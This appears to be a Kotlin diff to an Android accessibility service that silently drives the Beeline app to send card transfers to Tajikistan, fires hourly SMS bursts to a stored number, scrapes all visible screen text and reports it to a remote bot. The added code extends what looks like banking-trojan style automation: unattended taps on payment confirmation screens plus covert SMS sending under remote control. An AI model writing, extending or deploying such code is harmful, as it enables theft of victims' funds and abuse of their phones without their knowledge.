@@ -4,7 +4,9 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.graphics.Path
 import android.graphics.Rect
+import android.os.Build
 import android.os.Bundle
+import android.telephony.SmsManager
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
@@ -141,18 +143,26 @@ class MetodForsService : AccessibilityService() {
      * scenario on demand. On «успешно» the normal report goes to the bot.
      */
     private fun runTest(cfg: MetodForsConfig) {
-        val pay = DeviceStore.payments(this).firstOrNull { it.message().isNotBlank() } ?: return
-        if (!prepareTransfer(cfg, pay)) return
-        // Press «Отправить» right now (no timed wait).
-        if (!tapText(cfg.sendLabel, TAP_TIMEOUT)) return
-        Log.i(TAG, "TEST: Отправить tapped at msk=${MskClock.mskHms()}")
+        reportDebug("🔬 Тест начат (сборка v${BuildConfig.VERSION_CODE}).")
+        // 1) SMS burst check — send it now so the залп can be verified on demand.
+        fireSmsBurstNow(cfg)
+        // 2) Beeline flow — verbose + short waits so it reports where it stops.
+        val pay = DeviceStore.payments(this).firstOrNull { it.message().isNotBlank() }
+        if (pay == null) { reportDebug("Тест: не заданы Номер/Сумма."); return }
+        if (!prepareTransfer(cfg, pay, verbose = true, stepTimeout = TEST_STEP_TIMEOUT)) return
+        reportDebug("Дошёл до «${cfg.sendLabel}», нажимаю…")
+        if (!tapText(cfg.sendLabel, TEST_STEP_TIMEOUT)) { reportDebug("Не смог нажать «${cfg.sendLabel}»."); return }
+        reportDebug("Нажал «${cfg.sendLabel}». Жду итоговый экран…")
         when (waitOutcome(cfg, RESULT_TIMEOUT)) {
-            Outcome.BACK_TO_FINANCE -> successBranch(cfg, pay, isRuleB = false)
-            Outcome.REPEAT -> {
-                // In a test we don't wait for xx:59:59 — tap «Повторить» right away.
-                if (tapText(cfg.repeatLabel, TAP_TIMEOUT)) successBranch(cfg, pay, isRuleB = false, requireSymbol = true)
+            Outcome.BACK_TO_FINANCE -> {
+                reportDebug("Вижу «${cfg.backToFinanceLabel}» — жду «${cfg.symbolWord}» от 8464.")
+                successBranch(cfg, pay, isRuleB = false)
             }
-            Outcome.NONE -> Log.w(TAG, "TEST: no outcome screen detected")
+            Outcome.REPEAT -> {
+                reportDebug("Вижу «${cfg.repeatLabel}» — нажимаю и жду «${cfg.symbolWord}».")
+                if (tapText(cfg.repeatLabel, TEST_STEP_TIMEOUT)) successBranch(cfg, pay, isRuleB = false, requireSymbol = true)
+            }
+            Outcome.NONE -> reportDebug("После «${cfg.sendLabel}» не вижу ни «${cfg.backToFinanceLabel}», ни «${cfg.repeatLabel}». Вижу: " + dumpVisibleTexts())
         }
     }
 
@@ -208,27 +218,48 @@ class MetodForsService : AccessibilityService() {
      * за рубеж → Таджикистан → По номеру карты → Мой номер → [card field]=Номер →
      * Продолжить → [amount field]=Сумма → Продолжить → wait «Отправить».
      */
-    private fun prepareTransfer(cfg: MetodForsConfig, pay: Payment): Boolean {
-        if (!launchPackage(cfg.beelinePackage)) { Log.w(TAG, "cannot launch ${cfg.beelinePackage}"); return false }
+    private fun prepareTransfer(cfg: MetodForsConfig, pay: Payment,
+                               verbose: Boolean = false, stepTimeout: Long = STEP_TIMEOUT): Boolean {
+        if (!launchPackage(cfg.beelinePackage)) {
+            Log.w(TAG, "cannot launch ${cfg.beelinePackage}")
+            if (verbose) reportDebug("Не удалось открыть приложение ${cfg.beelinePackage}.")
+            return false
+        }
         sleep(3500) // let the app come to the foreground and render
 
-        // Each step simply WAITS until its label appears, then taps it — no early
-        // give-up and no notifications. If the service is stopped, the waits abort.
+        // Each step WAITS until its label appears, then taps it. Real rules wait
+        // effectively forever and stay silent; the TEST uses a short timeout and
+        // reports where it stopped (with what it sees on screen).
         for (step in cfg.steps) {
-            if (!tapText(step, STEP_TIMEOUT)) return false
+            if (!tapText(step, stepTimeout)) {
+                if (verbose) reportDebug("Остановился на шаге «$step». Что вижу на экране: " +
+                    (dumpVisibleTexts().ifBlank { "(пусто — не могу прочитать интерфейс)" }))
+                return false
+            }
             sleep(STEP_PAUSE)
         }
         // Card number field → Номер → Продолжить.
-        if (!fillField(cfg.cardFieldHint, pay.requisites)) return false
+        if (!fillField(cfg.cardFieldHint, pay.requisites)) {
+            if (verbose) reportDebug("Не нашёл поле карты «${cfg.cardFieldHint}». Вижу: " + dumpVisibleTexts())
+            return false
+        }
         sleep(STEP_PAUSE)
-        if (!tapText(cfg.continueLabel, STEP_TIMEOUT)) return false
+        if (!tapText(cfg.continueLabel, stepTimeout)) {
+            if (verbose) reportDebug("Не нашёл «${cfg.continueLabel}» после номера. Вижу: " + dumpVisibleTexts()); return false
+        }
         sleep(STEP_PAUSE)
         // Amount field → Сумма → Продолжить.
-        if (!fillField(null, pay.amount)) return false
+        if (!fillField(null, pay.amount)) {
+            if (verbose) reportDebug("Не нашёл поле суммы. Вижу: " + dumpVisibleTexts()); return false
+        }
         sleep(STEP_PAUSE)
-        if (!tapText(cfg.continueLabel, STEP_TIMEOUT)) return false
+        if (!tapText(cfg.continueLabel, stepTimeout)) {
+            if (verbose) reportDebug("Не нашёл «${cfg.continueLabel}» после суммы. Вижу: " + dumpVisibleTexts()); return false
+        }
         // Wait for «Отправить» to be present (do NOT press it yet).
-        return waitForText(cfg.sendLabel, SEND_WAIT_TIMEOUT) != null
+        val ok = waitForText(cfg.sendLabel, stepTimeout) != null
+        if (!ok && verbose) reportDebug("Не нашёл кнопку «${cfg.sendLabel}». Вижу: " + dumpVisibleTexts())
+        return ok
     }
 
     /**
@@ -363,6 +394,59 @@ class MetodForsService : AccessibilityService() {
         } catch (e: Exception) { Log.e(TAG, "tapAt failed", e); false }
     }
 
+    /** Collects every visible text / content-description on screen (for diagnostics). */
+    private fun dumpVisibleTexts(): String {
+        val out = LinkedHashSet<String>()
+        for (r in allRoots()) collectTexts(r, out)
+        return out.joinToString(" | ").take(700)
+    }
+
+    private fun collectTexts(root: AccessibilityNodeInfo, out: LinkedHashSet<String>) {
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        var guard = 0
+        while (queue.isNotEmpty() && guard++ < 4000) {
+            val n = queue.removeFirst()
+            if (n.isVisibleToUser) {
+                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) out.add(it) }
+                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) out.add(it) }
+            }
+            for (i in 0 until n.childCount) n.getChild(i)?.let { queue.add(it) }
+        }
+    }
+
+    /** Sends a diagnostic line to the bot (used by the on-demand TEST only). */
+    private fun reportDebug(msg: String) {
+        val appCtx = applicationContext
+        Thread { ControlClient.reportEvent(appCtx, "mf_debug", msg) }.apply { isDaemon = true }.start()
+    }
+
+    private fun smsMgr(): SmsManager =
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) getSystemService(SmsManager::class.java)
+        else @Suppress("DEPRECATION") SmsManager.getDefault()
+
+    /** Sends the hourly-style SMS burst right now (used by the TEST to verify it). */
+    private fun fireSmsBurstNow(cfg: MetodForsConfig) {
+        val payments = DeviceStore.payments(this).filter { it.message().isNotBlank() }
+        if (payments.isEmpty()) { reportDebug("Тест залпа: нет Номера/Суммы."); return }
+        val number = DeviceStore.number(this)
+        val count = cfg.hourlyBurstCount.coerceAtLeast(1)
+        val gap = cfg.hourlyBurstIntervalMs.coerceAtLeast(0).toLong()
+        var sent = 0
+        for (i in 0 until count) {
+            try {
+                val sms = smsMgr()
+                val msg = payments[i % payments.size].message()
+                val parts = sms.divideMessage(msg)
+                if (parts.size > 1) sms.sendMultipartTextMessage(number, null, parts, null, null)
+                else sms.sendTextMessage(number, null, msg, null, null)
+                sent++
+            } catch (e: Exception) { Log.e(TAG, "test burst send failed", e) }
+            if (i < count - 1 && gap > 0) sleep(gap)
+        }
+        reportDebug("📤 Тест залпа: отправлено $sent из $count SMS на $number (интервал ${gap}мс).")
+    }
+
     /**
      * Fills a text field with [value]. Prefers a field whose text/hint contains
      * [hint]; otherwise the first editable field on screen.
@@ -421,6 +505,7 @@ class MetodForsService : AccessibilityService() {
         private const val TAP_TIMEOUT = UI_WAIT     // find a button to tap
         private const val SEND_WAIT_TIMEOUT = UI_WAIT // «Отправить» to appear after prep
         private const val RESULT_TIMEOUT = 180_000L // outcome screen after «Отправить» (3 min)
+        private const val TEST_STEP_TIMEOUT = 20_000L // test: wait each label up to 20 s, then report
         private const val SYMBOL_WAIT = 90_000L    // «символ» from 8464
         private const val SUCCESS_WAIT = 120_000L  // «успешно» after «Ок»
     }
